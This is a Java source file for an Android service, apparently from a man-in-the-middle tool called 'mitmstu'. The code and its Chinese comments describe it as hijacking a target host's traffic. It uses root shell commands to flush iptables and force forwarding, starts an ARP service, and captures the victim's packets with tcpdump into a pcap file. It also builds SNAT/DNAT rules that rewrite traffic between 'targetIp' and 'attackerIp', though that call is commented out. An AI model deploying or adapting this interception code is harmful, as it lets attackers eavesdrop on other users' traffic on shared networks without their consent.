
/**   
 * @Title: ProxyService.java 
 * @Package: com.github.fdxxw.mitmstu.service 
 * @Description: TODO
 * @author fdxxw ucmxxw@163.com 
 * @date 2017年4月11日 下午3:15:17 
 */


package com.github.fdxxw.mitmstu.service;

import java.text.SimpleDateFormat;
import java.util.Date;

import com.github.fdxxw.mitmstu.common.AppContext;
import com.github.fdxxw.mitmstu.utils.ShellUtils;

import android.content.Intent;

/** 
 * 代理服务，路由转发
 * @author fdxxw ucmxxw@163.com
 * @date 2017年4月11日 下午3:15:17 
 */

public class ProxyService extends BaseService {
    
    
    
    /** 开启ip转发 */
      	
    public static String[] START_IP_FORWARD = {
            "iptables -t nat -F",
            "iptables -F",
            "iptables -X",
            "iptables -P FORWARD ACCEPT"}; 
    
    
    /** 
     * 添加源地址是被攻击主机的地址时，修改为攻击者的地址（外出数据）的转发规则
     */ 	
    public static String ALTER_SOURCE_ADDRESS_CMD = 
            "iptables -t nat -A POSTROUTING -s targetIp -j SNAT --to-source attackerIp"; 
    
    
    /** 删除对应的规则*/
      	
    public static String UN_ALTER_SOURCE_ADDRESS_CMD ;
    
    
    /**  
     * 添加目的地址是攻击者主机的地址时，修改为被攻击者的地址（流入数据）的转发规则。
     */
      	
    public static String ALTER_TARGET_ADDRESS_CMD = 
            "iptables -t nat -A PREROUTING -d attackerIp -j DNAT --to targetIp";
    
    
    /** 删除对应的规则 */
      	
    public static String UN_ALTER_TARGET_ADDRESS_CMD;
    
    public static String[] HIJACK_CMD = new String[2];
    
    public static String[] UN_HIJACK_CMD = new String[2];
    
    private Intent intent = null;
    
    private Thread hijack = null;
    
    /** 劫持数据命令*/
    
    private String hijack_cmd = null;
    
    
    /** 保存数据劫持的文件名*/
        
    public static String hijack_file_name = null;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        this.intent = intent;
        String targetIp = intent.getStringExtra("targetIp");
        String attackerIp = intent.getStringExtra("attackerIp");
        ALTER_SOURCE_ADDRESS_CMD = ALTER_SOURCE_ADDRESS_CMD.replace("targetIp", targetIp).replace("attackerIp", attackerIp);
        ALTER_TARGET_ADDRESS_CMD = ALTER_TARGET_ADDRESS_CMD.replace("targetIp", targetIp).replace("attackerIp", attackerIp);
        
        UN_ALTER_SOURCE_ADDRESS_CMD = ALTER_SOURCE_ADDRESS_CMD.replace("-A", "-D");
        UN_ALTER_TARGET_ADDRESS_CMD = ALTER_TARGET_ADDRESS_CMD.replace("-A", "-D");
        HIJACK_CMD[0] = ALTER_SOURCE_ADDRESS_CMD;
        HIJACK_CMD[1] = ALTER_TARGET_ADDRESS_CMD;
        UN_HIJACK_CMD[0] = UN_ALTER_SOURCE_ADDRESS_CMD;
        UN_HIJACK_CMD[1] = UN_ALTER_TARGET_ADDRESS_CMD;
        
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String date = df.format(new Date());
        
        hijack_file_name = "hijack_" + date + ".pcap";
        
        hijack_cmd = "tcpdump -w '" + AppContext.getmStoragePath() + "/" + hijack_file_name + "'" 
                + " host " + AppContext.getTarget().getIp();
        
        startHiJack();
        return super.onStartCommand(intent, flags, startId);
    }
    
     
    /** 
     * 启动数据劫持
     * @author fdxxw ucmxxw@163.com  
     */
      	
    private void startHiJack() {
        startArpService();
        hijack = new Thread() {
            public void run() {
                ShellUtils.execCommand(START_IP_FORWARD, true, false, false);
                ShellUtils.execCommand(hijack_cmd, true, false, false);
               // ShellUtils.execCommand(HIJACK_CMD, true, false, false);
            };
        };
        hijack.start();
        AppContext.isHijackRunning = true;
    }
    
     
    /** 
     * 停止数据劫持服务
     * @author fdxxw ucmxxw@163.com  
     */
      	
    private void stopHiJack() {
        if(hijack != null) {
            hijack.interrupt();
            hijack = null;
        }
        new Thread() {
            public void run() {
                ShellUtils.execCommand("killall iptables", true, false, true);
                ShellUtils.execCommand("killall tcpdump", true, false, true);
                //ShellUtils.execCommand(UN_HIJACK_CMD, true, false, true);
            };
        }.start();
        AppContext.isHijackRunning = false;
        stopArpService();
    }
    
	
    @Override
    public void onDestroy() {
        stopHiJack();
        super.onDestroy();
    }
}
